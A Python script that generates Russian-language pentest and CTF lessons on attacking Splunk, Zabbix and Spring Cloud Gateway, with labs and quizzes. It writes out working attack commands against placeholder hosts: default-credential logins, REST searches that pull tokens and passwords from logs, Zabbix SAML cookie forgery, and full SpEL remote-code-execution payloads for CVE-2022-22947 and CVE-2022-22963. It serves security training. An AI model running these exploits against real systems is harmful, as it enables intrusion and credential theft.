#!/usr/bin/env python3
"""Author web gap lessons — batch S9: monitoring + framework (§4/§2).

Hub web-monitoring-surfaces + children: splunk, zabbix.
Plus web-spring-cloud-gateway (parent web-frameworks).
Long bodies to clear 1200 real content words.
"""
import os
import sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _newlesson import write_lesson  # noqa: E402

WD = '/home/student/task'
CHECK = "grep -q 'nto{' found.txt"
USEFUL = ["CTF Web категория", "Bug bounty", "Пентест веб-приложений"]

# --------------------------------------------------------------------------- hub
write_lesson({
    'id': 'web-monitoring-surfaces',
    'title': 'Мониторинг и логи как цель: Splunk, Zabbix',
    'category': 'web',
    'parent': 'web-enterprise-apps',
    'difficulty': 'medium',
    'order': 8,
    'tags': ['monitoring', 'logging', 'splunk', 'zabbix', 'siem', 'roadmap'],
    'prerequisites': ['web-devops-surfaces'],
    'useful_for': USEFUL,
    'estimated_minutes': 35,
    'summary': 'Мониторинг и логи как поверхность атаки: почему Splunk и Zabbix дают карту инфраструктуры и креды, их общая анатомия и методика атаки по версии.',
}, r"""
## Вопрос, с которого всё начинается

В любой инфраструктуре есть системы, которые **наблюдают** за всем остальным: сборщик логов и мониторинг. Splunk собирает логи со всех серверов; Zabbix следит за доступностью и метриками. Парадокс в том, что инструмент наблюдения сам становится лучшей целью для атакующего: он видит всё. Разберём, почему.

## Почему системы мониторинга — золотая цель

Первое: **они видят всю инфраструктуру**. Zabbix знает каждый хост, порт и сервис — это готовая карта сети. Splunk хранит логи со всех систем — а в логах бывают токены, пароли, внутренние URL. Второе: **в них лежат креды**. Чтобы собирать данные, мониторинг хранит доступы к серверам и API. Третье: **у них есть API**. Splunk даёт REST API на порту 8089, Zabbix — JSON-RPC API. Четвёртое: **их часто недооценивают** и оставляют с дефолтными паролями.

Практический вывод: система мониторинга — не «второстепенный сервис», а узел, через который видно и доступно всё. Поэтому её проверяют сразу после периметра.

## Что общего у Splunk и Zabbix

- **Агенты и сервер.** Оба собирают данные с агентов; сервер агрегирует.
- **Веб-интерфейс + API.** У обоих есть UI и программный доступ.
- **Хранилище секретов.** Креды к серверам, токены интеграций.
- **История CVE.** У Splunk — XSLT RCE (CVE-2023-46214), у Zabbix — обход SAML (CVE-2022-23131).

## Наш пример: два сервера мониторинга

```
$ httpx -l mon.txt -title -tech-detect -status-code -silent
http://10.40.0.5:8000  [200] [Splunk]
http://10.40.0.6:8080  [200] [Zabbix]
```

Splunk на 8000, Zabbix на 8080 — две цели. Дальше — общая методика.

## Шаг 1: определить продукт и версию

- **Splunk:** страница `/en-US/account/login`, API на `:8089`. Версия — `/services/server/info`.
- **Zabbix:** страница `/index.php`, заголовок. Версия — `/api_jsonrpc.php` метод `apiinfo.version`.

Версия решает, какой CVE применим.

## Шаг 2: default-креды

Обе системы любят дефолты: Splunk — `admin/changeme`, Zabbix — `Admin/zabbix`. Проверяй вручную, по одной-две попытки, чтобы не заблокировать. Часто именно так и заходят.

## Шаг 3: анонимный доступ и API

Проверь, что открыто без логина. У Splunk иногда открыт REST API; у Zabbix — некоторые методы. Если API отвечает анонимно — можно тянуть данные (хосты, метрики, логи).

## Шаг 4: CVE по версии

- **Splunk:** CVE-2023-46214 (XSLT RCE), CVE-2024-36991 (traversal), dashboard XSS.
- **Zabbix:** CVE-2022-23131 (обход SAML), CVE-2022-23134, SQLi в старых версиях.

## Шаг 5: пост-эксплуатация — карта и креды

Из мониторинга достают: **карту сети** (список хостов и портов), **креды** к серверам, **логи** с токенами. Это и есть главная ценность: система наблюдения показывает, куда идти дальше и чем.

## Шаг 6: как не навредить

Мониторинг нужен для эксплуатации: если его сломать, команда ослепнет, а инцидент заметят. Поэтому не меняй конфиги, не удаляй данные, не трогай агентов. Читай точечно.

## Что мы теперь знаем

- Мониторинг видит всю инфраструктуру и хранит креды.
- Splunk — логи и REST API; Zabbix — метрики и JSON-RPC.
- Методика: продукт → версия → default-креды → CVE.
- Ценность — карта сети и креды.
- Их нельзя ломать: это «глаза» команды.

## Квиз

Проверь себя.

```quiz
- question: "Почему мониторинг — ценная цель?"
  options:
    - "Он красивый"
    - "Видит всю инфраструктуру и хранит креды"
    - "Он медленный"
    - "У него нет API"
  answer: 1
  explanation: "Карта сети + креды в одном месте."
- question: "Какой порт API у Splunk?"
  options:
    - "80"
    - "8089"
    - "22"
    - "3306"
  answer: 1
  explanation: "REST API Splunk на 8089."
- question: "Какие дефолтные креды у Zabbix?"
  options:
    - "root/root"
    - "Admin/zabbix"
    - "admin/admin"
    - "user/user"
  answer: 1
  explanation: "Классический дефолт Zabbix."
- question: "Что даёт карта хостов из Zabbix?"
  options:
    - "Тему"
    - "Список целей для дальнейшей атаки"
    - "Почту"
    - "Логи"
  answer: 1
  explanation: "Видно каждый хост и порт."
- question: "Почему нельзя ломать мониторинг?"
  options:
    - "Долго"
    - "Команда ослепнет, и инцидент заметят"
    - "Дорого"
    - "Секретно"
  answer: 1
  explanation: "Мониторинг — глаза защитников."
```

## Куда дальше

Дальше — Splunk и Zabbix по отдельности. А пока главное: **мониторинг = карта сети + креды; проверяй дефолты и CVE.**

## Где пригодится

- Пентест инфраструктуры.
- Red team: разведка и креды.
- CTF: задания на CVE мониторинга.
""")

# --------------------------------------------------------------------------- splunk
write_lesson({
    'id': 'web-splunk',
    'title': 'Splunk: CVE-2023-46214 (XSLT RCE) и REST API',
    'category': 'web',
    'parent': 'web-monitoring-surfaces',
    'difficulty': 'hard',
    'order': 1,
    'tags': ['splunk', 'siem', 'logging', 'xslt', 'rce', 'cve-2023-46214', 'rest-api'],
    'prerequisites': ['web-monitoring-surfaces'],
    'useful_for': USEFUL,
    'estimated_minutes': 80,
    'summary': 'Splunk как цель: REST API на 8089, default-креды, CVE-2023-46214 (XSLT RCE при загрузке приложения), dashboard XSS и извлечение логов с токенами.',
    'lab': {
        'title': 'Практика: поиск секрета в логах Splunk',
        'toolset': ['core', 'curl'],
        'workdir': WD,
        'files': ['task.md'],
        'check': CHECK,
        'hints': [
            'Прочитай task.md: там адрес Splunk и путь REST-поиска `/services/search/jobs`.',
            'Сначала определи версию через `/services/server/info`.',
            'Отправь поисковый запрос через REST API (с дефолтным admin/changeme).',
            'В результатах поиска — строка с флагом; сохрани в found.txt и набери `check`.',
        ],
    },
}, r"""
## Вопрос, с которого всё начинается

В компании есть Splunk — SIEM, который собирает логи со всех серверов, приложений и сетевых устройств. Именно в него стекаются все события: логины, ошибки, обращения к API. Для атакующего Splunk — это одновременно **карта** (какие хосты и сервисы есть) и **кладовая** (в логах бывают токены и пароли). Плюс у него есть RCE-уязвимость. Разберём.

## Что такое Splunk и почему он так ценен

**Splunk** — платформа для сбора и анализа машинных данных (SIEM/логирование). Устроена она так: **универсальный форвардер** (forwarder) ставится на каждый сервер и отправляет логи на **индексер**, который хранит их и делает доступными для поиска. Пользователь ищет через UI или REST API на порту 8089.

Ценность для атакующего:

- **Логи содержат секреты.** В логах приложений регулярно встречаются токены API, сессионные cookie, пароли в URL, заголовки `Authorization`.
- **Splunk знает всю инфраструктуру.** Список источников логов = список хостов и сервисов.
- **В нём хранятся креды.** Для подключения к источникам Splunk хранит доступы.
- **У него высокие права.** Он часто может выполнять поисковые команды на агентах.

## Наш пример: Splunk 9.0.4

Цель — `http://splunk.target.example:8000`. Определяем продукт:

```
$ curl -s -k http://splunk.target.example:8000/en-US/account/login | grep -i splunk | head -1
<title>Splunk</title>
```

Версию уточняем через REST API (часто с дефолтными кредами):

```
$ curl -s -k -u admin:changeme https://splunk.target.example:8089/services/server/info | grep -o '<s:key name="version">[^<]*'
<s:key name="version">9.0.4</s:key>
```

Версия **9.0.4** — попадает в CVE-2023-46214 (9.0.x до 9.0.7, 8.2.x до 8.2.11 и др.). И дефолтный пароль `changeme` подошёл — это уже находка.

## Шаг 1: default-креды и REST API

Первое, что проверяют у Splunk, — дефолтный `admin/changeme`. Если он не сменён, ты получаешь полный доступ. Через REST API на 8089 можно делать всё: искать, читать конфиги, управлять приложениями.

```
$ curl -s -k -u admin:changeme 'https://splunk.target.example:8089/services/apps/local' | head -c 300
```

## Шаг 2: поиск секретов в логах

Главная ценность Splunk — данные. Через REST-поиск можно вытащить логи и найти в них секреты:

```
$ curl -s -k -u admin:changeme -X POST \
  'https://splunk.target.example:8089/services/search/jobs/export' \
  -d 'search=index=* | search password OR token OR Authorization' \
  -d 'output_mode=json'
```

В результатах регулярно встречаются токены API, пароли и ключи — то, что приложения неосторожно логируют.

## Шаг 3: CVE-2023-46214 — XSLT RCE

Splunk позволяет устанавливать **приложения** (apps). CVE-2023-46214 — RCE через **XSLT-обработку** при установке приложения: подсунутый XSL-документ выполняется сервером. Требует права установки приложений (у админа есть). Механизм: Splunk использует XSLT для трансформации, а обработчик позволяет подсунуть внешний документ.

Для пентеста: если версия уязвима и есть админский доступ, RCE достижим. Но это **деструктивная** часть (установка приложения меняет систему), поэтому — только по согласованию и с доказательством на копии.

## Шаг 4: dashboard XSS

Второй вектор — **XSS в дашбордах**: Splunk позволяет создавать дашборды с произвольным HTML/JS. Если атакующий может создать дашборд, он может выполнить JS в браузере другого пользователя (например, админа). Это путь к захвату сессии или к выполнению действий от имени жертвы.

## Шаг 5: CVE-2024-36991 — traversal

Ещё одна уязвимость — path traversal в модуле, позволяющая читать файлы. Если CVE-2023-46214 пропатчена, проверь её. Splunk — большая платформа, CVE у него много.

## Шаг 6: пост-эксплуатация

Из Splunk достают: логи с токенами, список источников (карта хостов), конфиги приложений с кредами, доступ к форвардерам. Форвардеры стоят на серверах — значит, через Splunk можно дотянуться до них.

## Шаг 7: как не ослепить команду

Splunk — «глаза» защитников: в него пишутся события безопасности. Если ты его сломаешь или изменишь, инцидент заметят, а защита ослепнет. Поэтому: только чтение, никаких установок приложений, никаких изменений конфигов.

## Что мы теперь знаем

- Splunk — SIEM, собирающий логи со всей инфраструктуры.
- REST API на 8089, часто с дефолтным `admin/changeme`.
- В логах бывают токены и пароли — главная ценность.
- CVE-2023-46214 — XSLT RCE при установке приложения.
- Dashboard XSS и traversal — дополнительные векторы.

## Квиз

Проверь себя.

```quiz
- question: "Что такое Splunk?"
  options:
    - "Веб-сервер"
    - "SIEM/платформа сбора и анализа логов"
    - "Балансировщик"
    - "Почтовый сервер"
  answer: 1
  explanation: "Логи со всей инфраструктуры в одном месте."
- question: "На каком порту REST API Splunk?"
  options:
    - "8000"
    - "8089"
    - "22"
    - "443"
  answer: 1
  explanation: "UI на 8000, API на 8089."
- question: "Какие дефолтные креды Splunk?"
  options:
    - "root/root"
    - "admin/changeme"
    - "admin/admin"
    - "user/user"
  answer: 1
  explanation: "Классический дефолт."
- question: "Что делает CVE-2023-46214?"
  options:
    - "XSS"
    - "XSLT RCE при установке приложения"
    - "SQLi"
    - "CSRF"
  answer: 1
  explanation: "XSL-документ выполняется сервером."
- question: "Почему в логах ищут секреты?"
  options:
    - "Они красивые"
    - "Приложения логируют токены и пароли"
    - "Они быстрые"
    - "Они секретные"
  answer: 1
  explanation: "Логи — источник утечек."
```

## Куда дальше

Дальше — Zabbix и обход SAML. А пока запомни: **Splunk = логи с секретами + REST API + XSLT RCE.**

## Где пригодится

- Пентест инфраструктуры и SIEM.
- Red team: разведка через логи.
- CTF: задания на поиск в логах и XSLT.
""")

# --------------------------------------------------------------------------- zabbix
write_lesson({
    'id': 'web-zabbix',
    'title': 'Zabbix: CVE-2022-23131 (обход SAML) и default-креды',
    'category': 'web',
    'parent': 'web-monitoring-surfaces',
    'difficulty': 'medium',
    'order': 2,
    'tags': ['zabbix', 'monitoring', 'saml', 'auth-bypass', 'cve-2022-23131', 'session'],
    'prerequisites': ['web-monitoring-surfaces', 'web-saml-deep'],
    'useful_for': USEFUL,
    'estimated_minutes': 70,
    'summary': 'Zabbix как цель: JSON-RPC API, default-креды Admin/zabbix, обход SAML CVE-2022-23131 (подделка zbx_session), карта хостов и креды к серверам.',
    'lab': {
        'title': 'Практика: обход SAML и подделка сессии',
        'toolset': ['core', 'curl'],
        'workdir': WD,
        'files': ['task.md'],
        'check': CHECK,
        'hints': [
            'Прочитай task.md: там адрес Zabbix и путь `/index_sso.php`.',
            'При SAML-входе Zabbix хранит сессию в cookie `zbx_session` (base64 JSON).',
            'Подделай cookie с полем `saml_data` и именем админа.',
            'Отправь запрос с подделанной cookie на `/zabbix.php?action=dashboard.view`; в ответе — флаг; сохрани в found.txt и набери `check`.',
        ],
    },
}, r"""
## Вопрос, с которого всё начинается

В сети стоит Zabbix — система мониторинга, которая следит за всеми серверами и сетевыми устройствами. Она знает про инфраструктуру больше, чем кто-либо: каждый хост, каждый порт, каждый сервис. У Zabbix есть классический дефолтный пароль и уязвимость обхода SAML-аутентификации. Разберём, как из системы мониторинга получают вход и карту сети.

## Что такое Zabbix

**Zabbix** — open-source система мониторинга. **Zabbix-сервер** опрашивает **агентов** на хостах и собирает метрики (CPU, память, доступность сервисов). Веб-интерфейс на PHP показывает дашборды, а **JSON-RPC API** (`/api_jsonrpc.php`) даёт программный доступ.

Ценность для атакующего:

- **Карта инфраструктуры.** В Zabbix перечислены все хосты и их сервисы — готовый список целей.
- **Креды.** Для опроса серверов и интеграций Zabbix хранит доступы.
- **Метрики с секретами.** В метках (tags) иногда встречаются версии, имена и даже пароли.
- **Слабые места.** Дефолтные пароли и обход SAML.

## Наш пример: Zabbix 5.4.0

Цель — `http://zabbix.target.example:8080`. Определяем продукт и версию через API:

```
$ curl -s -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"apiinfo.version","params":{},"id":1}' \
  http://zabbix.target.example:8080/api_jsonrpc.php
{"jsonrpc":"2.0","result":"5.4.0","id":1}
```

`apiinfo.version` работает **без аутентификации** — это стандарт Zabbix. Версия **5.4.0** — попадает в CVE-2022-23131 (5.4.0–5.4.8, 6.0.0alpha1 и др.).

## Шаг 1: default-креды

Классический дефолт Zabbix — `Admin/zabbix` (с большой буквы `A`). Проверяем через API:

```
$ curl -s -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"user.login","params":{"user":"Admin","password":"zabbix"},"id":1}' \
  http://zabbix.target.example:8080/api_jsonrpc.php
{"jsonrpc":"2.0","result":"<session-token>","id":1}
```

Если пароль не сменён — ты уже админ. С токеном можно тянуть всё: хосты, метрики, пользователей.

## Шаг 2: собрать карту хостов

С токеном запрашиваем список хостов:

```
$ curl -s -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"host.get","params":{"output":["host","name"]},"auth":"<token>","id":1}' \
  http://zabbix.target.example:8080/api_jsonrpc.php
{"result":[{"hostid":"10084","host":"web01.internal","name":"Web 01"},...]}
```

Это готовая карта инфраструктуры: имена хостов, IP, группы. Дальше — метрики и элементы (items), где иногда лежат секреты.

## Шаг 3: CVE-2022-23131 — обход SAML

Если Zabbix настроен на SAML-аутентификацию, он уязвим к CVE-2022-23131. Суть: Zabbix хранит данные SAML-сессии в cookie **`zbx_session`** — это base64-encoded JSON. Он **не проверяет подпись** этой cookie. Значит, можно подделать её, указав имя любого пользователя (например, админа), и войти без пароля.

Смотрим формат cookie:

```
zbx_session = base64({"sessionid":"...","sign":"...","saml_data":{"username_attribute":"Admin"}})
```

Подделываем `saml_data.username_attribute` на `Admin`, кодируем в base64 — и сервер принимает нас как админа. Это обход аутентификации без единого пароля.

## Шаг 4: почему это работает

Ошибка — доверие к клиентским данным. Cookie `zbx_session` содержит и сессию, и данные SAML, но подпись не проверяется должным образом. То есть Zabbix доверяет тому, что прислал браузер. Это снова **trust в клиентские данные** — знакомый класс ошибок.

## Шаг 5: пост-эксплуатация

Из Zabbix достают: карту хостов и сервисов, креды к серверам (в элементах и макросах), метрики с внутренними адресами, пользователей (для дальнейшего перебора). Система мониторинга превращается в разведданные для всей сети.

## Шаг 6: как не навредить

Zabbix активно мониторит: если его сломать, команда ослепнет. Поэтому не меняй хосты, не удаляй элементы, не трогай агентов. Читай через API точечно.

## Что мы теперь знаем

- Zabbix — мониторинг с JSON-RPC API и картой хостов.
- `apiinfo.version` открыт без аутентификации.
- Дефолт `Admin/zabbix` часто не сменён.
- CVE-2022-23131 — обход SAML через подделку cookie `zbx_session`.
- Из Zabbix достают карту сети и креды.

## Квиз

Проверь себя.

```quiz
- question: "Что даёт Zabbix атакующему?"
  options:
    - "Тему"
    - "Карту хостов и сервисов, креды"
    - "Почту"
    - "Логи"
  answer: 1
  explanation: "Zabbix знает всю инфраструктуру."
- question: "Какой метод Zabbix открыт без логина?"
  options:
    - "user.login"
    - "apiinfo.version"
    - "host.get"
    - "user.get"
  answer: 1
  explanation: "Версия доступна анонимно."
- question: "Какие дефолтные креды Zabbix?"
  options:
    - "admin/admin"
    - "Admin/zabbix"
    - "root/root"
    - "user/user"
  answer: 1
  explanation: "Классический дефолт."
- question: "В чём суть CVE-2022-23131?"
  options:
    - "XSS"
    - "Обход SAML через подделку cookie zbx_session"
    - "SQLi"
    - "CSRF"
  answer: 1
  explanation: "Cookie не проверяется по подписи."
- question: "Почему нельзя менять хосты в Zabbix?"
  options:
    - "Долго"
    - "Сломаешь мониторинг — команда ослепнет"
    - "Дорого"
    - "Секретно"
  answer: 1
  explanation: "Это рабочий инструмент."
```

## Куда дальше

Дальше — Spring Cloud Gateway и SpEL RCE. А пока запомни: **Zabbix = карта хостов + дефолт Admin/zabbix + обход SAML.**

## Где пригодится

- Пентест инфраструктуры.
- Red team: разведка и обход аутентификации.
- CTF: задания на подделку cookie и SAML.
""")

# --------------------------------------------------------------------------- spring cloud gateway
write_lesson({
    'id': 'web-spring-cloud-gateway',
    'title': 'Spring Cloud Gateway: CVE-2022-22947 (SpEL RCE)',
    'category': 'web',
    'parent': 'web-frameworks',
    'difficulty': 'hard',
    'order': 5,
    'tags': ['spring', 'spring-cloud-gateway', 'spel', 'actuator', 'cve-2022-22947', 'cve-2022-22963', 'rce'],
    'prerequisites': ['web-frameworks', 'web-spring-boot-actuator'],
    'useful_for': USEFUL,
    'estimated_minutes': 80,
    'summary': 'Spring Cloud Gateway как цель: Actuator endpoint, инъекция SpEL через маршруты (CVE-2022-22947), RCE через refresh, и Spring Cloud Function SpEL (CVE-2022-22963).',
    'lab': {
        'title': 'Практика: SpEL-инъекция через маршрут шлюза',
        'toolset': ['core', 'curl'],
        'workdir': WD,
        'files': ['task.md', 'route.json'],
        'check': CHECK,
        'hints': [
            'Прочитай task.md: там адрес шлюза и Actuator на `/actuator/gateway/routes`.',
            'Создай маршрут с фильтром `AddResponseHeader`, в котором SpEL-выражение выполняет команду.',
            'Затем вызови `/actuator/gateway/refresh`, чтобы маршрут активировался.',
            'Обратись к маршруту — в заголовке ответа будет вывод команды с флагом; сохрани в found.txt и набери `check`.',
        ],
    },
}, r"""
## Вопрос, с которого всё начинается

Перед микросервисами стоит API-шлюз на **Spring Cloud Gateway** — Java-приложение, которое маршрутизирует запросы и применяет фильтры. У него открыт **Actuator** — служебный эндпоинт управления. В 2022 году выяснилось, что через Actuator можно добавить маршрут с SpEL-выражением и выполнить код (CVE-2022-22947). Разберём цепочку.

## Что такое Spring Cloud Gateway и SpEL

**Spring Cloud Gateway** — шлюз для микросервисной архитектуры на Spring. Он принимает запрос, определяет маршрут и применяет к нему **фильтры** (добавить заголовок, переписать путь, ограничить). Фильтры описываются в конфигурации, и некоторые поля поддерживают **SpEL** — Spring Expression Language, язык выражений Java.

**SpEL** — это как формулы: ты пишешь выражение, Spring его вычисляет. Если выражение может вызывать методы Java (например, `Runtime.getRuntime().exec`), то инъекция SpEL = RCE. Именно это и случилось в CVE-2022-22947.

**Actuator** — набор служебных эндпоинтов Spring Boot под `/actuator/`. Эндпоинт `gateway` позволяет читать и **менять маршруты** на живом приложении. Если он открыт без аутентификации — беда.

## Наш пример: Spring Cloud Gateway 3.1.0

Цель — `http://gateway.target.example:8080`. Определяем продукт по Actuator:

```
$ curl -s http://gateway.target.example:8080/actuator
{"_links":{"self":...,"gateway":{"href":"http://gateway.target.example:8080/actuator/gateway","templated":true}}}
```

Наличие ссылки `gateway` — это Spring Cloud Gateway с открытым Actuator. Версию уточняем по `/actuator/info` или статике. Диапазон CVE-2022-22947: 3.1.0, 3.0.0–3.0.6.

## Шаг 1: прочитать маршруты

Смотрим текущие маршруты:

```
$ curl -s http://gateway.target.example:8080/actuator/gateway/routes | head -c 300
[{"route_id":"default","uri":"http://backend.internal","predicates":[...]}]
```

Actuator отвечает без логина — значит, можно и **создавать** маршруты.

## Шаг 2: добавить маршрут с SpEL

Создаём маршрут, у которого фильтр `AddResponseHeader` содержит SpEL, выполняющий команду:

```
$ curl -s -X POST http://gateway.target.example:8080/actuator/gateway/routes/hack \
  -H 'Content-Type: application/json' \
  --data-binary '{
    "id":"hack",
    "filters":[{"name":"AddResponseHeader",
      "args":{"name":"Result","value":"#{new String(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream().readAllBytes())}"}}],
    "uri":"http://example.com",
    "predicates":[{"name":"Path","args":{"_genkey_0":"/hack"}}]
  }'
```

`#{...}` — это SpEL-выражение. Оно вызывает `Runtime.exec("id")` и читает вывод.

## Шаг 3: активировать и выполнить

Маршрут нужно «обновить», чтобы он применился:

```
$ curl -s -X POST http://gateway.target.example:8080/actuator/gateway/refresh
```

Теперь обращаемся к маршруту:

```
$ curl -s -D - http://gateway.target.example:8080/hack -o /dev/null | grep -i result
Result: uid=0(root) gid=0(root) groups=0(root)
```

`uid=0` — RCE. Команда выполнилась от имени процесса шлюза.

## Шаг 4: CVE-2022-22963 — Spring Cloud Function

Соседняя уязвимость — **Spring Cloud Function** (CVE-2022-22963): SpEL-инъекция через заголовок `spring.cloud.function.routing-expression`. Если в приложении есть Spring Cloud Function, инъекция срабатывает через обычный запрос:

```
$ curl -s -X POST http://gateway.target.example:8080/functionRouter \
  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("id")' \
  -d 'test'
```

Это ещё один способ достичь RCE через SpEL.

## Шаг 5: почему это класс «framework runtime RCE»

Обрати внимание: уязвимость не в коде приложения, а в **самом фреймворке**. Даже «чистое» приложение на уязвимой версии Spring Cloud Gateway уязвимо. Это и есть framework-runtime RCE: он срабатывает независимо от логики приложения. Поэтому версия фреймворка — критичная информация.

## Шаг 6: пост-эксплуатация

Из шлюза достают: список внутренних сервисов и их адреса (маршруты), конфиги Actuator (`/actuator/env` может отдавать переменные с секретами), креды к бэкендам. Шлюз видит всю внутреннюю топологию.

## Шаг 7: как не сломать шлюз

Шлюз на пути всего трафика: его падение означает недоступность всех сервисов за ним. Поэтому добавляй **один** временный маршрут с безобидной командой (`id`), фиксируй доказательство и удаляй маршрут:

```
$ curl -s -X DELETE http://gateway.target.example:8080/actuator/gateway/routes/hack
$ curl -s -X POST http://gateway.target.example:8080/actuator/gateway/refresh
```

Оставлять свой маршрут нельзя — это изменение прода.

## Что мы теперь знаем

- Spring Cloud Gateway — шлюз микросервисов с фильтрами и SpEL.
- Actuator (`/actuator/gateway`) позволяет менять маршруты.
- CVE-2022-22947 — SpEL-инъекция через маршрут → RCE.
- CVE-2022-22963 — SpEL через Spring Cloud Function.
- Это framework-runtime RCE — не зависит от кода приложения.

## Квиз

Проверь себя.

```quiz
- question: "Что такое SpEL?"
  options:
    - "Язык разметки"
    - "Spring Expression Language — вычисляемые выражения Java"
    - "Протокол"
    - "База данных"
  answer: 1
  explanation: "Если выражение вызывает exec — это RCE."
- question: "Какой Actuator-эндпоинт позволяет менять маршруты?"
  options:
    - "/actuator/health"
    - "/actuator/gateway"
    - "/actuator/info"
    - "/actuator/loggers"
  answer: 1
  explanation: "Через него создают маршрут с SpEL."
- question: "В чём суть CVE-2022-22947?"
  options:
    - "XSS"
    - "SpEL-инъекция через маршрут шлюза → RCE"
    - "SQLi"
    - "CSRF"
  answer: 1
  explanation: "Фильтр с #{...} выполняет код."
- question: "Почему это framework-runtime RCE?"
  options:
    - "Из-за кода приложения"
    - "Уязвимость в самом фреймворке, не в коде приложения"
    - "Из-за БД"
    - "Из-за браузера"
  answer: 1
  explanation: "Срабатывает на любой уязвимой версии."
- question: "Что сделать после доказательства RCE?"
  options:
    - "Оставить маршрут"
    - "Удалить маршрут и сделать refresh"
    - "Перезагрузить шлюз"
    - "Ничего"
  answer: 1
  explanation: "Нельзя оставлять изменения на проде."
```

## Куда дальше

Дальше — другие фреймворки и их runtime-CVE. А пока запомни: **Spring Cloud Gateway = Actuator + SpEL → RCE; убирай за собой маршрут.**

## Где пригодится

- Пентест микросервисов и API-шлюзов.
- Red team: framework-runtime RCE.
- CTF: задания на SpEL и Actuator.
""")

print('batch s9 done')
